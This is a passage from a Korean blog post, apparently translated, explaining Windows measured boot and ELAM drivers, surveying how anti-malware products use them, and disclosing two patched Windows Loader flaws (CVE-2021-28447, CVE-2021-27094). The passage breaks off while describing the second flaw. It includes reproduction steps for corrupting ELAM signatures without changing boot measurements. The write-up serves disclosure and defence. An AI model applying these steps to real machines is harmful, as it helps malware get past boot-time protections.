자세한 기술 정보는 <a href="https://source.android.com/security/verifiedboot/verified-boot">여기</a>서 찾을 수 있다.</p><h2 id="Pre-boot-verification"><a href="#Pre-boot-verification" class="headerlink" title="Pre-boot verification"></a>Pre-boot verification</h2><p>Pre-boot verification은 잘 알려지지 않은 기술이며 일반적으로 PCI (Peripheral Component Interconnect) 장치 또는 사용자 지정 UEFI 이미지로 구현된다. 부팅 드라이브에 있는 부트 로더를 시작하기 전에 확인 프로세스는 하드웨어 구성, 노출된 펌웨어 메모리, 실행 파일 및 기타 데이터 (예 : Windows Installation의 레지스트리 키값) 등의 무결성을 확인한다. </p><p>Pre-boot verification은 이전에는 초기화 코드를 포함하는 읽기 전용 메모리 (option ROM)가 있는 PCI 장치로 구현되었다. 초기화 코드는 부트 로더의 첫 번째 명령어 위치에 중단점을 설치해 중단점에 도달하면 PCI 장치의 메모리에서 사용자 지정 OS가 시작되는 프로세스로 이루어져 있다. OS는 연결된 드라이브에서 찾은 파일 시스템을 파싱하고 확인 프로세스를 수행하는데, 이때 해시는 무결성이 확인된 시스템 드라이브 또는 PCI 장치의 메모리에 저장되며 검증에 성공하면 원래 부트 로더가 실행되고 운영체제가 시작된다.</p><p>현재는 PCI 장치에서 사용자 지정 UEFI 이미지를 메인보드에 제공하는 것으로 구현되어 있다. 사용자 지정 UEFI 이미지에는 확인 프로세스에 필요한 파서가 포함되어 있으며 USB 부팅을 위해 USB 드라이브를 기반으로 한 구현도 있다. 이전 방식과 비교해 사용자가 부팅 순서를 변경하지 않는다는 가정하에 BIOS / UEFI 환경에 대한 중단점 또는 애드온을 사용하여 부팅 프로세스에 간섭할 필요가 없다.</p><p>이 접근 방식은 BIOS 및 UEFI를 포함한 펌웨어의 무결성을 확인하는 기능이 제한되지만, 사용자 지정 UEFI 이미지를 사용하면 설계상 신뢰할 수 있는 영역에 대부분의 펌웨어를 포함하게 된다.</p><p>또 다른 단점은 공식 Windows에서 구현된 파일 시스템 및 Windows 레지스트리 파싱 코드를 동일하게 생성하는 것이 거의 불가능하다는 것이다. 일반적으로 Linux 사용자가 NTFS 파일 시스템을 마운트 하면 동일한 파일 시스템을 탐색하는 Windows 사용자와 동일한 디렉터리 레이아웃과 파일 내용이 표시된다. 그러나 Pre-boot verification은 실제로 드라이브에 저장된 원시 데이터는 동일하나 다른 데이터를 반환할 수 있다. </p><p>예를 들어 대부분의 Pre-boot verification 제품은 Windows 레지스트리 트랜잭션 로그 파일을 지원하지 않는다. 즉, Kernel 수준에서 실행되는 멀웨어가 레지스트리 키값을 수정해 Pre-boot verification에서 임의의 값을 가져오도록 할 수 있다. Windows Kernel은 트랜잭션 로그 파일을 지원하므로 이러한 변경 사항은 부팅 도중과 부팅 후에 운영체제에 표시된다. 이는 <a href="https://dfir.ru/2018/10/07/hiding-data-in-the-registry/">이전 글에서</a> 자세히 설명되어 있다.  </p><p>verified 및 measured boot 프로세스는 코드와 데이터를 사용하기 전 검증하기 때문에 앞서 설명한 공격에 대한 영향을 받지 않을 것으로 예상된다. 실행될 파일이 파일 시스템 드라이버에 따라 다른 해시를 생성하는 경우 파일이 verified 및 measured를 거쳐 동일한 드라이버로 실행되기 때문에 보안에 영향을 미치지 않는다. 그러나 이 접근 방법 또한 항상 완벽하지는 않다. 이 글에서는 Windows Loader (<code>winload.exe</code> 또는 <code>winload.efi</code>)의 measured boot에서 발견된 두 가지 취약점에 중점을 둘 것이며, 별도의 소프트웨어 구성 요소(이후에 설명할 Loader와 kernel)에서 데이터와 코드를 검증하는 과정에서의 이슈에 대해 강조한다.</p><h1 id="Early-Launch-Anti-Malware"><a href="#Early-Launch-Anti-Malware" class="headerlink" title="Early Launch Anti-Malware"></a>Early Launch Anti-Malware</h1><p>취약점을 살펴보기 전에 Windows Kernel (<code>ntoskrnl.exe</code>)에서 제공하는 안티 멀웨어 인터페이스를 살펴본다.</p><p>두 가지의 주요 부팅 보안인  verified boot와 measured boot가 활성화되어 있고 하드웨어/펌웨어 취약점을 고려하지 않는 경우 멀웨어의 초기 목표 삽입 지점은 boot-start 드라이버다.</p><p>악성 boot-start 드라이버를 방지하기 위해 Microsoft는 <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/install/early-launch-antimalware">ELAM (Early Launch Anti-Malware) 인터페이스</a>를 Windows 8에서부터 도입했다. </p><p>ELAM 드라이버는 다른 드라이버보다 먼저 시작해 종속성과 유효성을 검사한다. 각 boot-start 드라이버에 대해 ELAM 드라이버는 다음 값을 반환한다.</p><ul><li>unknown - 알 수 없음</li><li>good - 정상적인 드라이버</li><li>bad - 악성 드라이버</li><li>bad but critical for the boot - 악성 드라이버지만 부팅 프로세스에 빠져서는 안 될 요소</li></ul><p>또한 ELAM 드라이버는 boot-start 드라이버에서 수행하는 레지스트리 작업을 기록하는 콜백을 설정하고 런타임 안티 멀웨어의 구성 요소에 저장할 수 있다.</p><p>자체 ELAM 드라이버를 사용하는 안티 멀웨어 소프트웨어는 Windows 8.1에서 도입된 <a href="https://docs.microsoft.com/en-us/windows/win32/services/protecting-anti-malware-services-">코드 무결성 보호</a>가 제공되어 보호된 서비스로 실행할 수 있다. </p><p>부팅 프로세스 중에 둘 이상의 ELAM 드라이버가 활성화될 수 있으며 각 ELAM 드라이버는 지정된 boot-start 드라이버를 독립적으로 확인하며 이 드라이버에 대한 최종 결과값은 다음 순위를 기반으로 한다.</p><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled.png" alt="measured-boot-vuln/Untitled.png"></p><blockquote><p>Table 1. ELAM scores (ranks)</p></blockquote><p>한 ELAM 드라이버가 <code>good</code> 을 반환하고 다른 ELAM 드라이버가 <code>bad</code>를 반환하면 이 boot-start 드라이버는 <code>bad</code>로 결정된다.</p><p>위 ELAM 드라이버의 반환 값과 아래 정책을 기반으로 Kernel은 boot-start 드라이버를 허용하거나 거부할 수 있다.</p><ul><li>모든 드라이버 허용</li><li><code>good</code>, <code>unknown</code>, <code>bad but critical</code> 드라이버 허용(기본값)</li><li><code>good</code>, <code>unknown</code> 드라이버 허용</li><li><code>good</code> 드라이버 허용</li></ul><p>ELAM 드라이버는 다음 데이터를 기반으로 드라이버의 스코어를 결정한다.</p><ul><li>드라이버 파일의 경로</li><li>해당 서비스 항목에 대한 레지스트리 경로</li><li>드라이버에 대한 인증서 정보 (게시자, 발급자)</li><li>이미지 파일 해시값</li></ul><p>문제는 <a href="https://www.microsoft.com/security/blog/2020/09/01/force-firmware-code-to-be-measured-and-attested-by-secure-launch-on-windows-10/">DRTM (Dynamic Root of Trust for Measurement for Measurement)</a>이 적용되면 이전에 boot-start 드라이버를 메모리로 읽어오는 데 사용된 펌웨어를 신뢰할 수 없어 관련 드라이버가 초기화되기 전에는 드라이브에서 아무것도 읽을 수 없기 때문에 파일 내용이 ELAM 드라이버에 노출되지 않는다. 따라서 기존의 멀웨어 시그니처는 적용할 수 없다. 그러나 경로, 해시 및 인증서 등의 정보로 악성 boot-start 드라이버를 차단하는 것은 효과적인 방법으로 볼 수 있다.</p><p>따라서 Microsoft는 다음과 같은 새로운 규칙을 정의했다.</p><ul><li>ELAM 드라이버에는 단일 boot-start 드라이버를 확인할 수 있는 제한된 시간이 주어짐</li><li>ELAM 드라이버에는 모든 boot-start 드라이버를 확인할 수 있는 제한된 시간이 주어짐</li><li>ELAM 드라이버에는 코드 및 구성 데이터에 대해 제한된 메모리가 제공됨</li><li>ELAM 드라이버는 ELAM 레지스트리 하이브 (<code>C:\Windows\System32\config\ELAM</code>)의 특정 레지스트리 키 아래에 서명을 저장해야 함</li><li>ELAM 드라이버는 서명의 유효성을 검사해야 함.</li><li>ELAM 드라이버는 잘못된 서명을 처리해야 함 (이 경우 모든 boot-start 드라이버를 unknown으로 처리해야 함).</li><li>ELAM 드라이버는 악성 boot-start 드라이버 (또는 다른 정책 위반)가 식별되면 측정된 부팅 상태를 무효화해야 함</li></ul><p>ELAM 인터페이스가 처음 등장했을 때는 <a href="https://www.welivesecurity.com/2012/12/27/win32gapz-new-bootkit-technique/">효용성에 의문이 제기되었다</a>. bootkit은 악성코드를 VBR(Volume Boot Recod)에 기록하거나 IPL(Initial Program Loader)로 대체할 수 있으며 둘 다 Windows Kernel 이전에 실행되므로 ELAM 드라이버를 우회할 수 있었다. 그러나 Verified/Measured 부팅의 등장으로 위 기법의 적용이 어려워져 ELAM 인터페이스가 제 기능을 할 수 있게 되었다.</p><h1 id="ELAM-and-Measured-Signatures"><a href="#ELAM-and-Measured-Signatures" class="headerlink" title="ELAM and Measured Signatures"></a>ELAM and Measured Signatures</h1><p>Measured 부팅 중 ELAM 시그니처를 읽은 다음 Windows Loader에서 측정한다(<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/install/elam-driver-requirements#malware-signatures">출처</a>). 이렇게 하면 ELAM 시그니처가 신뢰 체인에 배치되어 증명 중에 누락 혹은 다운그레이드 된 시그니처를 감지할 수 있다.</p><p>ELAM 하이브 내의 특정 레지스트리 값에 저장된 위치만 측정되며 이 값을 <code>Measured</code>, <code>Policy</code> 및 <code>Config</code>라고 한다. 여기에는 공급 업체별 데이터를 포함할 수 있고 이름이 다르거나 유형이 <code>REG_BINARY</code>가 아닌 레지스트리 값은 측정되지 않는다.</p><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%201.png" alt="measured-boot-vuln/Untitled%201.png"></p><blockquote><p>Table 2. Trend Micro 및 Microsoft에서 각각 저장한 시그니처 데이터와 측정값(굵게 표시됨)</p></blockquote><p>ELAM 시그니처는 Windows Loader에 의해 측정되지만 ELAM 인터페이스는 Windows Kernel에 의해 제공된다는 점이 중요하다.</p><h1 id="Real-World-ELAM-Drivers"><a href="#Real-World-ELAM-Drivers" class="headerlink" title="Real-World ELAM Drivers"></a>Real-World ELAM Drivers</h1><p>2021 년 2월에 필자는 유명한 안티 멀웨어 제품의 ELAM 드라이버를 리버싱했다. 25개의 ELAM 드라이버가 있는 총 26 개의 제품 (2 개의 제품이 동일한 ELAM 드라이버를 공유)에서 24 개가 기본 구성으로 설치되어 있었다. </p><p>흥미롭게도 모든 ELAM 드라이버에는 보호된 안티 멀웨어 서비스를 시작하는 데 필요한 인증서 정보가 포함되어 있지만 26개 중 15개 제품에서 boot-start 드라이버에 대해 검사를 수행하지 않고 하드코딩된 결과값을 반환하거나 결과값을 전혀 제공하지 않았다. </p><blockquote><p>이러한 ELAM 드라이버를 placeholder driver라고 한다.</p></blockquote><p>두 개의 ELAM 드라이버는 런타임 안티 멀웨어 구성 요소에 대한 boot-start 드라이버 정보를 기록했지만 ELAM 드라이버에서는 실제 검사가 수행되지 않았으며 결과값은 항상 <code>unknown</code>이었고, 한 ELAM 드라이버는 검사를 수행하지 않고 모든 boot-start 드라이버의 결과값을 <code>good</code>으로 보고했다.</p><p>11개의 제품의 ELAM 드라이버는 boot-start 드라이버에 대해 몇 가지 검사를 수행했다. 그중 하나는 알려진 정상적인 인증서의 하드코딩된 목록을 가지고 있고 ELAM 하이브는 시그니처 데이터를 저장하는 데 사용되지 않았으며 2개는 시그니처 데이터에 ELAM 하이브와 SYSTEM 하이브를 모두 사용했다. 하나는 ELAM 하이브를 사용한 뒤 SYSTEM 하이브를 시그니처 데이터 대체로 사용하고 7개의 제품은 ELAM 하이브에서만 시그니처 데이터를 읽었다.</p><p>11 개의 ELAM 드라이버 중 단 2개만 결과값에 따라 증명을 취소할 수 있었으며 다른 드라이버는 해당 루틴을 호출조차 하지 않았다.</p><p>이제 제품의 이름을 언급하도록 하겠다.</p><p>놀랍게도 Windows Defender에서 제공되는 ELAM 드라이버는 언급된 모든 규칙을 따르지 않았으며 SYSTEM 하이브를 시그니처 데이터의 저장 위치로 사용하고 (기본 위치 인 ELAM 하이브 제외) 악성 boot-start 드라이버가 감지되었을 때 증명을 취소하지 않았다.</p><p>Kaspersky 및 ZoneAlarm 제품의 동일한 ELAM 드라이버는 ELAM 하이브와 SYSTEM 하이브 두 위치에서 시그니처 데이터를 읽었으며 증명 또한 취소되지 않았다.</p><p>Sophos 제품의 ELAM 드라이버는 모든 boot-start 드라이버를 <code>good</code>으로 표시한다. 이는 Sophos에 보안 이슈로 보고되었지만 보안 상의 결함이 없는 의도된 기능으로 간주되었다.</p><p>요약하자면, 대부분의 안티 멀웨어 제품은 ELAM 드라이버를 사용하여 악성 boot-start 드라이버를 검색하지 않았다. 대신 ELAM 드라이버를 사용하여 자체적으로 보호된 서비스로 시작하고 핵심 ELAM 기능은 하드 코딩된 단일 결과값을 제공하거나 결과값을 전혀 제공하지 않도록 구현되었다.</p><h1 id="ELAM-Hive"><a href="#ELAM-Hive" class="headerlink" title="ELAM Hive"></a>ELAM Hive</h1><p>ELAM 하이브는 <code>C:\Windows\System32\config\ELAM</code> 레지스트리 파일에 저장된다.</p><p><a href="https://github.com/msuhanov/regf/blob/master/Windows%20registry%20file%20format%20specification.md">이전 글에</a> 해당 포맷에 대한 설명이 있으며 취약성을 이해하는 데 필요한 몇 가지 핵심 사항이 있다.</p><ul><li>키 노드는 하위 키 목록을 가리킬 수 있다.<ul><li>키 노드 : 단일 레지스트리 키를 설명하는 데 사용되는 바이너리 구조</li><li>하위 키 목록 : 레지스트리 키의 하위 키를 설명하는 키 노드에 대한 오프셋 목록</li></ul></li><li>마찬가지로 키 노드는 값 목록을 가리킬 수 있다.<ul><li>값 목록: 키 값에 대한 오프셋 목록, 각 키 값은 레지스트리 키에 속하는 단일 레지스트리 값을 설명함</li></ul></li><li><code>0xFFFFFFFF</code>와 같은 오프셋은 “nil”을 표현한다.</li><li>이러한 오프셋은 절댓값이 아니며 레지스트리 파일의 시작 부분에서 오프셋을 얻으려면 4096 bytes를 추가해야 한다.</li><li>키 노드와 키 값은 각각 레지스트리 키의 이름과 레지스트리 값의 이름을 저장한다. 이는 확장 ASCII (Latin-1) 문자열 혹은 UTF-16LE 문자열이다. (확장 ASCII 문자열로 저장할 수 있으면 해당 형식으로 압축됨.)</li><li>하위 키에서 대소문자를 구분하지 않는 바이너리 검색을 사용하려면 하위 키 목록을 대문자 이름(사전 순 정렬)으로 정렬해야 한다.<ul><li>값 목록은 정렬할 필요 없음</li></ul></li><li>키 값은 레지스트리 값의 데이터 유형(예 : REG_BINARY)을 저장하고 값 데이터를 가리킨다.</li><li>4 bytes 이하의 값 데이터는 키 값에 직접 저장된다.</li><li>4 bytes 보다 큰 값 데이터는 다른 오프셋에 저장되며 이 오프셋은 키 값에 기록된다.</li><li>16344 bytes보다 큰 값 데이터는 16344 btyes 이하의 세그먼트에 저장되고 세그먼트에 대한 오프셋은 목록에서 참조된다. 키 값에는 데이터 대신 목록에 대한 오프셋이 저장된 Big Data Record의 오프셋이 저장된다.</li></ul><p>레지스트리 파일의 예제는 다음과 같다.</p><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%202.png" alt="measured-boot-vuln/Untitled%202.png"></p><blockquote><p>Figure 1<br>선택된 영역 - ELAM 하이브의 root key 노드<br>녹색 - 하위 키의 개수(2개)<br>빨간색 - 하위 키 목록에 대한 오프셋 (0x3328, 절대 오프셋: 0x3328+4096=0x4328)<br>노란색 - 키 이름 (“ROOT”, ASCII 문자열)</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%203.png" alt="measured-boot-vuln/Untitled%203.png"></p><blockquote><p>Figure 2<br>선택된 영역 - 루트 키에 대한 하위 키 목록<br>노란색 - 목록의 요소 수 (2개)<br>빨간색 - 두 개의 하위 키에 대한 오프셋 (0x3188 및 0x0120, 이 유형의 하위 키 목록에서는 4 개)</p></blockquote><p>각 오프셋 뒤에는 이름 해시가 포함되어 있으며 사전 순 정렬로 저장된다. (<code>0x3188</code>은 “Trend Micro” 키 노드에 해당하고 <code>0x0120</code>은 “Windows Defender” 키 노드에 해당됨)</p><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%204.png" alt="measured-boot-vuln/Untitled%204.png"></p><blockquote><p>Figure 3<br>선택된 영역 - “Windows Defender” 키 노드<br>빨간색 - 값 데이터(1)<br>노란색 - 목록에 대한 오프셋 (0x3180)</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%205.png" alt="measured-boot-vuln/Untitled%205.png"></p><blockquote><p>Figure 4<br>선택된 영역 - 값 목록(유효한 항목은 0x0230)</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%206.png" alt="measured-boot-vuln/Untitled%206.png"></p><blockquote><p>Figure 5<br>선택된 영역 - 키 값<br>노란색 - 데이터 크기 (0x215C 또는 8540 bytes)<br>빨간색 - 데이터 오프셋 (0x1020, 데이터가 4 bytes 이하인 경우 직접 저장)<br>파란색 - 값 유형 (3 또는 REG_BINARY)<br>녹색 - 값 이름 ( “Measured”, ASCII 문자열)</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%207.png" alt="measured-boot-vuln/Untitled%207.png"></p><blockquote><p>Figure 6<br>값 데이터</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%208.png" alt="measured-boot-vuln/Untitled%208.png"></p><blockquote><p>Figure 7<br>선택된 영역 - 데이터가 16344 bytes보다 크고 하이브 형식 버전이 1.4 이상인 경우의 Big Data Record Structure<br>빨간색 - 데이터 세그먼트 수 (2),<br>노란색 - 세그먼트 목록에 대한 오프셋 (0x3188)</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%209.png" alt="measured-boot-vuln/Untitled%209.png"></p><blockquote><p>Figure 8<br>선택된 영역 - 값 데이터 세그먼트 목록<br>빨간색 - 두 개의 오프셋 (0x4020 및 0x 8020)</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2010.png" alt="measured-boot-vuln/Untitled%2010.png"></p><blockquote><p>Figure 9<br>선택된 영역 - 세그먼트, 첫 번째 세그먼트에는 16344 bytes가 포함되고 마지막 세그먼트에는 나머지 데이터가 포함됨</p></blockquote><p>유심히 봐야 할 몇 가지 세부 사항</p><ol><li>레지스트리 하이브가 로드되면 형식 위반이 있는지 확인한다. 위반이 감지되면 참조를 포함하여 이를 수정하거나 관련 레지스트리를 삭제하려고 시도한다.</li><li>모든 하위 키 목록에 있는 요소의 사전 순 정렬이 확인된다. 두 개의 하위 키 (주어진 목록에 있는 현재 키와 이전 키)를 비교한 결과 잘못된 순서로 표시되면 현재 키가 삭제된다.</li><li>일반적으로 하이브가 마운트 되면 유저 모드 응용 프로그램이 잠기게 된다. 따라서 운영체제가 부팅을 완료하면 ELAM 하이브는 마운트 해제된 상태로 유지된다.</li><li>ELAM 하이브는 형식 버전 1.5를 사용하므로 Big Data Record가 활성화된다.</li><li>부팅 중에 Windows Loader는 ELAM 하이브를 단일 메모리 청크로 읽는다.</li></ol><h1 id="Measured-Boot-Vulnerabilities"><a href="#Measured-Boot-Vulnerabilities" class="headerlink" title="Measured Boot Vulnerabilities"></a>Measured Boot Vulnerabilities</h1><p>2020년 말, 2021년 초 관리자 권한으로 실행되는 악성 프로그램이 Measured Booting 프로세스에 영향을 주지 않고 ELAM 시그니처를 손상 및 삭제할 수 있는 두 가지 취약점을 발견하고 보고했다.</p><p>특히, Windows Loader는 ELAM 하이브에서 예상되는 레지스트리 값을 측정하는 반면 Windows Kernel은 손상된 ELAM 시그니처를 포함하거나 해당 레지스트리 값이 없는 하이브에서 다른 레지스트리 데이터를 확인해 이러한 Loader와 Kernel의 레지스트리 파싱 코드의 차이점을 악용한다.</p><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2011.png" alt="measured-boot-vuln/Untitled%2011.png"></p><blockquote><p>발견된 취약점의 CVE ID</p></blockquote><p>두 취약점 모두 보상을 받을 수 있었으며 CVE-2021–27094의 경우 업데이트를 배포하는 데 90일 이상이 걸렸고 해당 패치로 인해 데이터 손상 이슈가 발생했다.</p><h2 id="CVE-2021–28447"><a href="#CVE-2021–28447" class="headerlink" title="CVE-2021–28447"></a>CVE-2021–28447</h2><p>16344 bytes보다 큰 데이터로 ELAM 값을 측정할 때 Windows Loader는 Big Data Record를 파싱하지 않는다. 따라서 측정 중인 ELAM blob이 16344 bytes보다 크면 취약점을 트리거할 수 있다. 아래는 측정된 ELAM 값에 대한 데이터를 가져오는 데 사용되는 디 컴파일된 함수이다.</p><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2012.png" alt="measured-boot-vuln/Untitled%2012.png"></p><blockquote><p>측정 값 데이터를 가져 오는 데 사용되는 함수</p></blockquote><p>일반적인 경우 값 데이터가 16344 bytes 보다 크지 않으면 <code>KeyValue-&gt;Data</code> 필드에는 전체 값 데이터가 포함되고 <code>memmove()</code> 함수로 해당 필드의 데이터를 변수 <code>Heap</code>에 복사한다. 그러나 해당 함수에는 하이브 형식 버전, 값 데이터 크기에 대한 검사 등 Big Data Record를 처리하기 위한 코드가 존재하지 않는다. 따라서 데이터가 16344 bytes보다 크면 <code>KeyValue-&gt;Data</code>에는 값 데이터 대신 Big Data Record로 채워지지만 <code>memmove()</code> 호출은 이를 데이터로 생각해 Big Data Record와 이후 레지스트리 데이터를 로드된 레지스트리 파일에서 <code>Heap</code>으로 복사하게 된다. </p><p>이를 악용하면 특정 조건에서 공격자는 측정에 영향을 주지 않고 ELAM Blob을 수정할 수 있다. 예를 들어 값 데이터 세그먼트가 Big Data Record 이전에, 즉 레지스트리 파일의 더 낮은 오프셋에 저장되면 힙 변수에 포함되지 않고 측정되어 실제 값 데이터는 측정되지 않는다. 또는 값 데이터 세그먼트가 Big Data Record 이후에 저장되면 측정되지 않아 측정 중 계산된 해시를 변경하지 않고 이후의 값 데이터를 변경할 수 있다.</p><p>ELAM 하이브는 부팅 완료 이후에는 로드되지 않으므로 어떤 방식으로든 (예 : HEX 편집기 등) 변경할 수 있으므로 공격자가 레지스트리 파일을 제한 없이 임의로 수정할 수 있다. </p><h3 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h3><p>이 취약점은 이전에는 Windows Loader에서 이러한 레지스트리 값을 읽을 필요가 없었으므로 Big Data Record 케이스를 지원하지 않는 레거시 코드로 인해 발생했다.</p><h3 id="Fix"><a href="#Fix" class="headerlink" title="Fix"></a>Fix</h3><p>Microsoft는 Windows Loader에서 Big Data Record 케이스에 대한 지원을 구현하여 취약점을 수정했다. 해당 취약점은 ELAM blob의 임계값인 16344 bytes에 도달하지 않는 ELAM 드라이버에는 영향을 주지 않는다. </p><h3 id="Original-vulnerability-report"><a href="#Original-vulnerability-report" class="headerlink" title="Original vulnerability report"></a>Original vulnerability report</h3><pre><code class="hljs c"># SummaryWhen an ELAM driver stores a binary larger than 16344 bytes in one of three measured values (called &quot;Measured&quot;, &quot;Policy&quot;, or &quot;Config&quot;) within the ELAM hive (&quot;C:\Windows\System32\config\ELAM&quot;), this binary isn&#x27;t measured correctly by the Windows loader (winload.exe or winload.efi).Under specific conditions, a modification made to an ELAM blob won&#x27;t result in different PCR values, thus not affecting the measured boot (since PCR values are equal to the expected ones).# Description## Steps to reproduce(Screenshots attached.)<span class="hljs-number">1.</span> Mount the ELAM hive <span class="hljs-keyword">using</span> a registry editor.<span class="hljs-number">2.</span> Add a <span class="hljs-keyword">new</span> key under the root of the ELAM hive. Assign a <span class="hljs-keyword">new</span> value to <span class="hljs-keyword">this</span> key (in <span class="hljs-keyword">this</span> report, the value will be called <span class="hljs-string">&quot;Measured&quot;</span>).<span class="hljs-number">3.</span> Write more than <span class="hljs-number">16344</span> bytes of data to that value (see: <span class="hljs-string">&quot;01-elam-blob.png&quot;</span>).<span class="hljs-number">4.</span> Unmount the ELAM hive.<span class="hljs-number">5.</span> Reboot the system.<span class="hljs-number">6.</span> During the boot, the Windows loader measures data starting from the beginning of the CM_BIG_DATA structure as pointed by the CM_KEY_VALUE structure describing the <span class="hljs-string">&quot;Measured&quot;</span> value (see: <span class="hljs-string">&quot;02-elam-blob-measured.png&quot;</span>).    Since the expected data length is larger than the CM_BIG_DATA structure, subsequent bytes of the hive file (actually, from the memory region used to store the hive file loaded) are included into the measurement (instead of actual value data).<span class="hljs-number">7.</span> After the boot, change (<span class="hljs-keyword">using</span> a registry editor) several bytes within the value data, without altering the data size (see: <span class="hljs-string">&quot;03-elam-blob-altered.png&quot;</span>).<span class="hljs-number">8.</span> Reboot the system.<span class="hljs-number">9.</span> During the boot, the Windows loader will see the same CM_BIG_DATA structure <span class="hljs-keyword">and</span> subsequent bytes as value data (see: <span class="hljs-string">&quot;04-elam-blob-altered-measured.png&quot;</span>).## Root causeThe Windows loader doesn<span class="hljs-number">&#x27;</span>t support parsing value data stored <span class="hljs-keyword">using</span> the CM_BIG_DATA structure. This structure is used when the hive format version is <span class="hljs-number">1.4</span> <span class="hljs-keyword">or</span> newer <span class="hljs-keyword">and</span> value data to be stored is larger than <span class="hljs-number">16344</span> bytes.The ELAM hive uses the format version <span class="hljs-number">1.5</span>. Thus, the CM_BIG_DATA structure is supported in the NT kernel, but <span class="hljs-keyword">not</span> in the Windows loader.The OslGetBinaryValue routine (in the Windows loader) provides back a pointer to cell data containing the CM_BIG_DATA structure instead of parsing <span class="hljs-keyword">this</span> <span class="hljs-keyword">and</span> related structures <span class="hljs-keyword">and</span> then providing a pointer to consolidated data segments.## Attack scenariosFirst, ELAM blobs larger than <span class="hljs-number">16344</span> bytes aren<span class="hljs-number">&#x27;</span>t measured correctly. This is a serious security issue by itself.Finally, <span class="hljs-keyword">if</span> an ELAM driver uses existing measured ELAM blobs larger than <span class="hljs-number">16344</span> bytes, a malicious usermode program could alter (corrupt <span class="hljs-keyword">or</span> downgrade) these blobs without affecting the measured boot.Such an attack is possible when:* a <span class="hljs-built_in">list</span> of cells containing value data segments is stored before the CM_BIG_DATA structure, <span class="hljs-keyword">or</span>* such value data segments are stored before the CM_BIG_DATA structure, <span class="hljs-keyword">or</span>* a <span class="hljs-built_in">list</span> of cells containing value data segments <span class="hljs-keyword">and</span> such value data segments are all stored after the CM_BIG_DATA structure, but there is a large gap after the CM_BIG_DATA structure   (which isn<span class="hljs-number">&#x27;</span>t smaller than the defined value data size, so the hash calculation won<span class="hljs-number">&#x27;</span>t reach the actual value data, <span class="hljs-keyword">or</span> it<span class="hljs-number">&#x27;</span>s smaller than that, but the hash calculation doesn<span class="hljs-number">&#x27;</span>t reach the modified bytes of actual value data).Under any specific condition defined above, changing offsets to value data segments <span class="hljs-keyword">or</span> changing value data segments respectively won<span class="hljs-number">&#x27;</span>t be noticed during the measurement. (Since the hash is calculated over the internals of the hive file, but <span class="hljs-keyword">not</span> over the actual value data.)Since the ELAM hive isn<span class="hljs-number">&#x27;</span>t loaded after the boot, a malicious usermode program can open it <span class="hljs-keyword">and</span> alter its data in any way possible (<span class="hljs-keyword">this</span> is <span class="hljs-keyword">not</span> limited to registry functions exposed by the Advapi32 library, the hive file can be opened <span class="hljs-keyword">and</span> edited in a HEX editor), thus exploiting any pre-existing condition defined above.## Possible solutionHandle the CM_BIG_DATA structure when parsing a registry value <span class="hljs-keyword">using</span> the Windows loader.</code></pre><p>취약점의 관련 스크린샷은 아래에 첨부되어 있다.</p><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2013.png" alt="measured-boot-vuln/Untitled%2013.png"></p><blockquote><p>01-elam-blob.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2014.png" alt="measured-boot-vuln/Untitled%2014.png"></p><blockquote><p>02-elam-blob-measured.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2015.png" alt="measured-boot-vuln/Untitled%2015.png"></p><blockquote><p>03-elam-blob-altered.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2016.png" alt="measured-boot-vuln/Untitled%2016.png"></p><blockquote><p>04-elam-blob-altered-measured.png</p></blockquote><h2 id="CVE-2021–27094"><a href="#CVE-2021–27094" class="headerlink" title="CVE-2021–27094"></a>CVE-2021–27094</h2><p>이 취약점은 앞서 소개된 취약점보다 조금 복잡하다.<br>Windows Loader 또는 Windows Kernel에서는 하이브를 로드할 때 형식 위반이 있는지 확인한다. 이 검사는 Windows Loader에 의해 로드된 하이브에 대해 두 번 수행한 뒤 메모리의 Windows Kernel로 전달된다 (ELAM 하이브 포함).</p><p>이 검사 로직은 Windwos Loader와 Kernel이 유사하게 구현되었지만 차이점이 존재한다. 그중 하나가 Windows Loader는 하위 키 목록에 있는 요소의 사전 순 정렬을 확인하지 않는다는 것이다.</p><p>ELAM 하이브는 Windows Kernel에 의해 시작된 ELAM 드라이버에서 사용되므로 Windows Loader의 ELAM blob 측정과 ELAM 드라이버 사용 사이의 사전 순 정렬 검사가 삽입된다. Windows Loader에서 측정한 후 ELAM 드라이버에서 사용하기 전 ELAM blob을 포함하는 레지스트리 키를 임의 삭제하기 위해 이 검사 프로세스의 취약점을 이용할 수 있다.</p><p>공격자는 하이브를 마운트 한 다음 표준 API를 호출해 루트 키 아래에 있는 ELAM 하이브에 빈(값이 없는) 키를 삽입할 수 있다. 그리고 Windows Kernel이 측정된 ELAM blob이 존재하는 키를 삭제하도록 유도해야 하는데, 이는 공격자가 키 삽입 후 하이브의 마운트를 해제하고 HEX 편집기로 하이브 파일의 키 목록의 순서를 임의로 변경해 사전 순 정렬을 깨는 것으로 달성할 수 있다. </p><blockquote><p>역자:<br>하이브 마운트 → 표준 API로 빈 키 생성 → 마운트 해제 → 하이브 파일의 키 순서 변경<br>으로 나타낼 수 있습니다.</p></blockquote><br>위 설명의 예시는 아래 ELAM 하이브의 레이아웃을 살펴보면 이해가 쉽다.<ol><li>Key: Windows Defender<ul><li>Value: Measured</li></ul></li><li>Key: zz<ul><li>No values</li></ul></li></ol><blockquote><p>키 